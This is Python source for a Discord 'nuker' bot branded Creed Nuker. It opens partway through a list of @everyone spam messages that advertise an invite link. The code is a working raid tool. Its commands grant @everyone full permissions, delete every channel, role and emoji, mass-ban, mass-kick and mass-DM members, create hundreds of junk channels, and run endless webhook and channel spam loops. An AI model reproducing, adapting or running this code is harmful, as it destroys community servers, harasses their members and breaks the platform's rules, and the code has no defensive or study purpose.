"@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna"]

intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='.', intents=intents)
intents.guilds = True
intents.presences = True
intents.members = True
intents.guild_messages = True


@client.event
async def on_ready():
    os.system("cls & title [Creed Nuker] - Created By syngatelol")
    print(f'''
          {Fore.RED}  
 $$$$$$\                                      $$\       $$\   $$\           $$\                           
$$  __$$\                                     $$ |      $$$\  $$ |          $$ |                          
$$ /  \__| $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$$ |      $$$$\ $$ |$$\   $$\ $$ |  $$\  $$$$$$\   $$$$$$\  
$$ |      $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$ |      $$ $$\$$ |$$ |  $$ |$$ | $$  |$$  __$$\ $$  __$$\ 
$$ |      $$ |  \__|$$$$$$$$ |$$$$$$$$ |$$ /  $$ |      $$ \$$$$ |$$ |  $$ |$$$$$$  / $$$$$$$$ |$$ |  \__|
$$ |  $$\ $$ |      $$   ____|$$   ____|$$ |  $$ |      $$ |\$$$ |$$ |  $$ |$$  _$$<  $$   ____|$$ |      
\$$$$$$  |$$ |      \$$$$$$$\ \$$$$$$$\ \$$$$$$$ |      $$ | \$$ |\$$$$$$  |$$ | \$$\ \$$$$$$$\ $$ |      
 \______/ \__|       \_______| \_______| \_______|      \__|  \__| \______/ \__|  \__| \_______|\__|      
                                                                                                                
\033[91mready to wizz

          
Commands:
1. .wizz (self explanatory)
2. .ice (mass webhook spammer)
3. .massban (self explanatory)
4. .masskick (self explanatory)
5. .massdm (send a message to all members)
6. .raid (destroy channels and roles)
7. .crash (perform destructive actions)
8. .createchannels (self explanatory)
9. .deletechannels (self explanatory)
10. .createroles (makes 250 roles in a single discord server)
11. .deleteroles (delete every single role in a discord server)
12. .maxperms (gives the @everyone role max perms)
13. .help (the commands of this nuker in discord)          
Support: https://github.com/syngatelol
{Style.RESET_ALL}''')
    
client.remove_command("help")

@client.command()
async def help(ctx):
    embed = discord.Embed(title="Commands", description="List of available commands:")
    embed.add_field(name=".wizz", value="self explanatory.", inline=False)
    embed.add_field(name=".ice", value="Mass webhook spammer.", inline=False)
    embed.add_field(name=".massban", value="self explanatory.", inline=False)
    embed.add_field(name=".masskick", value="self explanatory.", inline=False)
    embed.add_field(name=".massdm", value="Send's a message to all members in a discord server.", inline=False)
    embed.add_field(name=".raid", value="Destroying channels and roles.", inline=False)
    embed.add_field(name=".crash", value="Ice with tea. Performing destructive actions.", inline=False)
    embed.add_field(name="createchannels", value="Self explanatory.", inline=False)
    embed.add_field(name=".deletechannels", value="self explanatory", inline=False)
    embed.add_field(name=".createroles", value="Makes 250 roles in a single discord server.", inline=False)
    embed.add_field(name=".deleteroles", value="deletes every single role in a discord server..", inline=False)
    embed.add_field(name=".maxperms", value="gives the @everyone role max perms)", inline=False)


    try:
        await ctx.author.send(embed=embed)
        await ctx.send("Help message sent to your DMs.", delete_after=5)
    except discord.Forbidden:
        await ctx.send("Unable to send the help message to your DMs. Here's the help:", delete_after=5)
        await ctx.send(embed=embed, delete_after=5)

    await ctx.message.delete(delay=15)

@client.command()
async def wizz(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=discord.Permissions.all())
        print("I have given everyone max perms")
    except Exception as e:
        print(f"I was unable to give everyone max perms: {e}")

    async with aiohttp.ClientSession() as session:
        async def delete_channels():
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(f"{channel.name} was deleted.")
                except Exception as e:
                    print(f"{channel.name} was NOT deleted: {e}")

        async def ban_members():
            async def ban_user(member):
                try:
                    async with session.put(f"https://discord.com/api/v9/guilds/{guild.id}/bans/{member.id}") as response:
                        if response.status == 204:
                            print(f"{member.name}#{member.discriminator} was banned.")
                        else:
                            print(f"{member.name}#{member.discriminator} was unable to be banned: {response.status}")
                except Exception as e:
                    print(f"{member.name}#{member.discriminator} was unable to be banned: {e}")

            await asyncio.gather(*[ban_user(member) for member in guild.members])

        async def delete_roles():
            async def delete_role(role):
                try:
                    async with session.delete(f"https://discord.com/api/v9/guilds/{guild.id}/roles/{role.id}") as response:
                        if response.status == 204:
                            print(f"{role.name} has been deleted.")
                        else:
                            print(f"{role.name} has not been deleted: {response.status}")
                except Exception as e:
                    print(f"{role.name} has not been deleted: {e}")

            await asyncio.gather(*[delete_role(role) for role in guild.roles])

        async def delete_emojis():
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print(f"{emoji.name} was deleted.")
                except Exception as e:
                    print(f"{emoji.name} wasn't deleted: {e}")

        async def unban_members():
            banned_users = await guild.bans()
            async def unban_user(ban_entry):
                user = ban_entry.user
                try:
                    async with session.delete(f"https://discord.com/api/v9/guilds/{guild.id}/bans/{user.id}") as response:
                        if response.status == 204:
                            print(f"{user.name}#{user.discriminator} was successfully unbanned.")
                        else:
                            print(f"{user.name}#{user.discriminator} was not unbanned: {response.status}")
                except Exception as e:
                    print(f"{user.name}#{user.discriminator} was not unbanned: {e}")

            await asyncio.gather(*[unban_user(ban_entry) for ban_entry in banned_users])

        await asyncio.gather(
            delete_channels(),
            ban_members(),
            delete_roles(),
            delete_emojis(),
            unban_members()
        )

        await guild.create_text_channel("syngate")
        for channel in guild.text_channels:
            link = await channel.create_invite(max_age=0, max_uses=0)
            print(f"New Invite: {link}")

        amount = 500
        for i in range(amount):
            await guild.create_text_channel(random.choice(SPAM_CHANNEL))

        print(f"Nuked {guild.name} successfully.")

@client.command()
@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))

@client.command()
async def ice(ctx):
    if ctx.author == client.user:
        return

    global spamming

    if ctx.message.content.lower() == '.ice':
        if spamming:
            await ctx.channel.send('Spamming is already in progress.')
        else:
            spamming = True
            guild = ctx.guild

            text_channels = [channel for channel in guild.channels if isinstance(channel, discord.TextChannel)]

            if len(text_channels) < 20:
                for channel in text_channels:
                    webhook = await channel.create_webhook(name='.gg/eviction ran me')
                    webhooks[channel.id] = webhook  
                    print(f"Webhook created in channel: {channel.name} ({channel.id})")
                    print(f"Webhook URL: {webhook.url}")
            else:
                
                selected_channels = random.sample(text_channels, k=10)
                for channel in selected_channels:
                    webhook = await channel.create_webhook(name='.gg/eviction ran me')
                    webhooks[channel.id] = webhook  
                    print(f"Webhook created in channel: {channel.name} ({channel.id})")
                    print(f"Webhook URL: {webhook.url}")

            
            while spamming:
                for channel_id, webhook in webhooks.items():
                    await webhook.send('/eviction X syngate was here @everyone')
                    print(f"Message sent in channel: {guild.get_channel(channel_id).name} ({channel_id})")
                    await asyncio.sleep(0.1)  

            await ctx.channel.send('Spamming started in the specified channels.')

    elif ctx.message.content.lower() == '.stopspam':
        spamming = False
        await ctx.channel.send('Spamming stopped.')

@client.event
async def on_webhook_update(payload):
    global spamming

    
    if payload.action_type == discord.AuditLogAction.webhook_delete:
        webhook_id = payload.target_id
        for channel_id, webhook in webhooks.items():
            if webhook.id == webhook_id:
                del webhooks[channel_id]

                
                if not webhooks:
                    spamming = False

@client.command()
async def massban(ctx):
    if ctx.author.guild_permissions.ban_members:
        members_to_ban = [member for member in ctx.guild.members if not member.bot and member != ctx.guild.owner]

        try:
            async with ctx.typing():
                banned_members = await asyncio.gather(*[ban_user(member) for member in members_to_ban])
                await ctx.send('Mass ban completed.')
                print('Users banned:', ', '.join(banned_members))
        except discord.Forbidden:
            return await ctx.send("I don't have the necessary permissions to perform the mass ban.")
        except discord.HTTPException as e:
            print(f"Failed to ban members: {e}")
            await ctx.send('An error occurred while performing the mass ban.')
    else:
        await ctx.send("You don't have the necessary permissions to use this command.")

async def ban_user(member):
    try:
        await member.ban(reason="Mass ban")
        return str(member)
    except discord.Forbidden:
        print(f"I don't have the necessary permissions to ban {member}.")
        return None
    except discord.HTTPException:
        print(f"Failed to ban {member} due to an HTTP error.")
        return None

@client.command()
async def massdm(ctx, *, message_content: str):
    guild = ctx.guild
    dm_content = message_content
    dm_count = 0
    for member in guild.members:
        try:
            if not member.bot:
                await member.send(dm_content)
                print(f"{Fore.RED}DM sent to {member.name}#{member.discriminator} (ID: {member.id}){Fore.RESET}")
                dm_count += 1
                await asyncio.sleep(0.5)
        except discord.Forbidden:
            print(f"{Fore.RED}Failed to send DM to {member.name}#{member.discriminator} (ID: {member.id}) - Missing Permissions{Fore.RESET}")
        except discord.HTTPException as e:
            if e.code == 50007:
                print(f"{Fore.RED}Failed to send DM to {member.name}#{member.discriminator} (ID: {member.id}) - Cannot send messages to this user{Fore.RESET}")
            else:
                print(f"{Fore.RED}Failed to send DM to {member.name}#{member.discriminator} (ID: {member.id}) - {e}{Fore.RESET}")

    print(f"{Fore.CYAN}DMs sent to {dm_count} members in the server.{Fore.RESET}")

@client.command()
async def raid(ctx):
    guild = ctx.guild
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]

    print('Deleting all roles and channels...')

    for role in guild.roles:
        try:
            await role.delete()
            print(f'{random.choice(colors)}Role "{role.name}" (ID: {role.id}) deleted.{Style.RESET_ALL}')
        except discord.Forbidden:
            print(f'{Fore.RED}Failed to delete role "{role.name}" (ID: {role.id}) - Missing Permissions{Style.RESET_ALL}')
        except discord.HTTPException as e:
            print(f'{Fore.RED}Failed to delete role "{role.name}" (ID: {role.id}) - {e}{Style.RESET_ALL}')

    for channel in guild.channels:
        try:
            await channel.delete()
            print(f'{random.choice(colors)}Channel "{channel.name}" (ID: {channel.id}) deleted.{Style.RESET_ALL}')
        except discord.Forbidden:
            print(f'{Fore.RED}Failed to delete channel "{channel.name}" (ID: {channel.id}) - Missing Permissions{Style.RESET_ALL}')
        except discord.HTTPException as e:
            print(f'{Fore.RED}Failed to delete channel "{channel.name}" (ID: {channel.id}) - {e}{Style.RESET_ALL}')

@client.command()
async def masskick(ctx):
    if ctx.author.guild_permissions.kick_members:
        await ctx.message.delete()

        members = await ctx.guild.fetch_members(limit=None).flatten()
        member_ids = [member.id for member in members]

        # Divide members into chunks of 100 for bulk kicking. DO NOT CHANGE ABOVE 100
        chunk_size = 100

        for i in range(0, len(member_ids), chunk_size):
            member_chunk = member_ids[i: i + chunk_size]

            for member_id in member_chunk:
                try:
                    member = ctx.guild.get_member(member_id)
                    if member:
                        await member.kick(reason='Mass Kick by .gg/eviction')
                        print(f"Kicked: {member.name}#{member.discriminator}")
                except Exception as e:
                    print(f"Failed to kick: {member_id}, Error: {e}")

    else:
        await ctx.send("You don't have the necessary permissions to use this command.")

@client.command()
async def crash(ctx):
    guild = ctx.guild

    invite_task = asyncio.create_task(create_invites(guild, 100))
    webhook_task = asyncio.create_task(create_webhooks(ctx.channel, 10000))
    text_channel_task = asyncio.create_task(create_text_channels(guild, 250))
    voice_channel_task = asyncio.create_task(create_voice_channels(guild, 250))
    name_change_task = asyncio.create_task(change_server_name(guild, 1000))
    nickname_change_task = asyncio.create_task(change_nicknames(guild))

    await asyncio.gather(invite_task, webhook_task, text_channel_task, voice_channel_task, name_change_task, nickname_change_task)

    await ctx.send("All actions have been executed!")

async def create_invites(guild, count):
    print("Creating invites...")
    for _ in range(count):
        await guild.text_channels[0].create_invite(max_uses=1)
        print("Invite created!")
        await asyncio.sleep(1)

async def create_webhooks(channel, count):
    print("Creating webhooks...")
    webhooks_created = 0
    while webhooks_created < count:
        try:
            webhook = await channel.create_webhook(name="fdksaljfdsjkalfdjkasl;fdjskl;fdsajkl;fsadjklfdsajklf;dsajklfdsajkl;fadsjkl;fsadj")
            print(f"Webhook created in channel '{channel.name}'!")
            webhooks_created += 1
        except discord.errors.HTTPException:
            print(f"Reached the webhook limit in channel '{channel.name}'. Creating a new text channel...")
            new_channel = await channel.guild.create_text_channel(name=f"new-channel-{webhooks_created + 1}")
            print(f"New text channel '{new_channel.name}' created!")
        await asyncio.sleep(1)

async def create_text_channels(guild, count):
    print("Creating text channels...")
    for _ in range(count):
        channel_name = ''.join(random.choices(string.ascii_letters, k=100))
        await guild.create_text_channel(name=channel_name)
        print("Text channel created!")
        await asyncio.sleep(1)

async def create_voice_channels(guild, count):
    print("Creating voice channels...")
    for _ in range(count):
        channel_name = ''.join(random.choices(string.ascii_letters, k=100))
        await guild.create_voice_channel(name=channel_name)
        print("Voice channel created!")
        await asyncio.sleep(1)

async def change_server_name(guild, count):
    print("Changing server name...")
    for _ in range(count):
        server_name = ''.join(random.choices(string.ascii_letters, k=30))
        try:
            await guild.edit(name=server_name)
            print(f"Server name changed to: {server_name}")
        except (discord.errors.HTTPException, asyncio.TimeoutError) as e:
            print(f"Error changing server name: {e}")
            print("Retrying...")
            await asyncio.sleep(1)
        else:
            await asyncio.sleep(10)
    print("Server name changes complete.")

async def change_nicknames(guild):
    print("Changing nicknames...")
    for member in guild.members:
        nickname = ''.join(random.choices(string.ascii_letters, k=30))
        try:
            await member.edit(nick=nickname)
            print(f"Nickname changed for {member.display_name}: {nickname}")
        except discord.errors.Forbidden:
            print(f"Cannot change nickname for {member.display_name} due to insufficient permissions.")
        except (discord.errors.HTTPException, asyncio.TimeoutError) as e:
            print(f"Error changing nickname for {member.display_name}: {e}")
    print("All nicknames changed!")

@client.command()
async def deletechannels(ctx):
    if not ctx.author.guild_permissions.manage_channels:
        return await ctx.send("You don't have permission to manage channels.")
    
    num_channels_to_delete = 100
    channels = ctx.guild.channels
    text_channels_to_delete = [channel for channel in channels if isinstance(channel, discord.TextChannel)][:num_channels_to_delete]
    voice_channels_to_delete = [channel for channel in channels if isinstance(channel, discord.VoiceChannel)][:num_channels_to_delete]

    for text_channel in text_channels_to_delete:
        try:
            await text_channel.delete()
            print(f"Deleted text channel '{text_channel.name}' ({text_channel.id})")
        except discord.HTTPException:
            print(f"Failed to delete text channel '{text_channel.name}' ({text_channel.id})")

    for voice_channel in voice_channels_to_delete:
        try:
            await voice_channel.delete()
            print(f"Deleted voice channel '{voice_channel.name}' ({voice_channel.id})")
        except discord.HTTPException:
            print(f"Failed to delete voice channel '{voice_channel.name}' ({voice_channel.id})")
    
    await ctx.send(f"Deleted {len(text_channels_to_delete) + len(voice_channels_to_delete)} channels.")

@client.command()
async def maxperms(ctx):
    guild = ctx.guild
    everyone_role = guild.default_role
    perms = discord.Permissions.all()
    
    try:
        await everyone_role.edit(permissions=perms)
        await ctx.send('Max permissions granted to everyone.')
    except discord.Forbidden:
        await ctx.send("I don't have the necessary permissions to grant max perms to everyone.")

@client.command()
async def createroles(ctx):
    guild = ctx.guild

    role_limit = 250
    created_roles = 0

    while created_roles < role_limit:
        try:
            color = discord.Color.random()
            role_name = f'.gg/eviction{created_roles + 1}'
            role = await guild.create_role(name=role_name, color=color)
            created_roles += 1
            print(f"{Fore.GREEN}Generated role: {role.name} (ID: {role.id}, Color: {role.color}){Style.RESET_ALL}")
        except discord.HTTPException as e:
            print(f'{Fore.RED} Failed to Generate role: {e}{Style.RESET_ALL}')
            break

    await ctx.send(f'{Fore.GREEN}Successfully Generated {created_roles} roles with random colors!{Style.RESET_ALL}')


@client.command()
async def deleteroles(ctx):
    guild = ctx.guild

    role_limit = 250
    deleted_roles = 0

    roles_copy = guild.roles.copy()

    for role in roles_copy:
        if role.name == "@everyone":
            continue

        while True:
            try:
                await role.delete()
                deleted_roles += 1
                print(f"{Fore.RED}Deleted role: {role.name} (ID: {role.id}){Style.RESET_ALL}")
                break
            except discord.HTTPException as e:
                print(f'{Fore.RED}Failed to delete role: {e} (Role: {role.name} - ID: {role.id}){Style.RESET_ALL}')

        if deleted_roles >= role_limit:
            break

    await ctx.send(f'{Fore.GREEN}Successfully deleted {deleted_roles} roles!{Style.RESET_ALL}')


@client.command()
async def createchannels(ctx, number: int = 500):
    await ctx.message.delete()
    guild = ctx.guild

    for i in range(1, number + 1):
        channel_name = ''.join(random.choices(string.ascii_letters, k=7))
        try:
            await guild.create_text_channel(channel_name)
            print(f"Channel '{channel_name}' created.")
        except Exception as e:
            print(f"Error creating channel '{channel_name}': {e}")

STREAMER_MODE_STATUS = {
    'type': discord.ActivityType.streaming,
    'name': 'wizzing discord.com servers',
    'url': 'https://twitch.tv/syngatelol'
}


@tasks.loop(seconds=120)
async def update_status():
    await client.change_presence(activity=discord.Streaming(**STREAMER_MODE_STATUS))

@client.command()
async def set_streamer_mode(ctx, *, status_message: str = 'wizzing discord.com'):
    global STREAMER_MODE_STATUS
    STREAMER_MODE_STATUS['name'] = status_message
    await ctx.send(f'Streamer mode status set to: {status_message}')

@client.command()
@commands.cooldown(1, 60, commands.BucketType.user)
async def random_streamer_status(ctx):
    global STREAMER_MODE_STATUS
    possible_statuses = [
        'wizzing servers',
        'nuking servers',
        'raiding servers',
        'mass pinging servers',
        'watching servers',
        '.gg/eviction',
        'Reading a book'
    ]
    random_status = random.choice(possible_statuses)
    STREAMER_MODE_STATUS['name'] = random_status
    await ctx.send(f'Random streamer mode status set to: {random_status}')

@client.event
async def on_message(message):
    if message.author.bot:
        return

    if message.content.lower().startswith('!set_streamer_mode'):
        return

    await client.process_commands(message)
token = input("Enter your bot token: ")
client.run(token)